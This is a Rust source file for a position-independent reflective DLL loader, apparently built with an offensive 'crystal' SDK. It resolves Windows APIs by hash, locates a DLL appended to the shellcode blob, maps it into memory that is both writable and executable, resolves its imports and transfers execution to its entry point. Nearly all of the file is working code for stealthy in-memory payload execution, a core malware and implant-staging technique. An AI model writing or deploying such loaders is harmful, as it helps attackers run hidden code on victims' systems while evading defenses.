#![no_std]
#![no_main]

use core::{ptr::null_mut};
use crystal_sdk::{append_data, import};
use crystal_bindings::tcg::{DLLDATA, EntryPoint, IMPORTFUNCS, LoadDLL, ParseDLL, ProcessImports, SizeOfDLL, findFunctionByHash, findModuleByHash};
use winapi::{shared::{minwindef::{DWORD, FARPROC, HMODULE, LPVOID}, ntdef::LPCSTR}, um::winnt::{DLL_PROCESS_ATTACH, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}};

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}

#[unsafe(no_mangle)]
pub extern "C" fn resolve(mod_hash: u32, func_hash: u32) -> FARPROC {
    unsafe {
        let h_module = findModuleByHash(mod_hash);
        findFunctionByHash(h_module, func_hash)
    }
}

append_data!(my_data, findAppendedDLL, "__DLLDATA__");

import!(KERNEL32!VirtualAlloc(lpAddress: LPVOID, dwSize: usize, flAllocationType: DWORD, flProtect: DWORD) -> LPVOID);
import!(LoadLibraryA(arg1: LPCSTR) -> HMODULE);
import!(GetProcAddress(arg1: HMODULE, arg2: LPCSTR) -> FARPROC);

#[unsafe(no_mangle)]
extern "C" fn go() {
    unsafe { 
        let src = findAppendedDLL(); /* find our DLL appended to this PIC */ 
        let dst;
        let mut data: DLLDATA = core::mem::zeroed();
        
        /* setup our IMPORTFUNCS data structure */
        let mut funcs = IMPORTFUNCS { 
            LoadLibraryA: Some(LoadLibraryA_ptr()), 
            GetProcAddress: Some(GetProcAddress_ptr()) 
        };
  
        /* parse our DLL! */
        ParseDLL(src as _, &mut data);
        
        /* allocate memory for it! */
        dst = VirtualAlloc( null_mut(), SizeOfDLL(&mut data) as usize, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        
        /* load the damned thing */
        LoadDLL(&mut data, src as _, dst as _);
        
        /* process the imports */
        ProcessImports(&mut funcs, &mut data, dst as _);
        
        /* pass execution to our DLL */   
        EntryPoint(&mut data, dst as _).unwrap_unchecked()(dst as _, DLL_PROCESS_ATTACH, null_mut());
    };
}
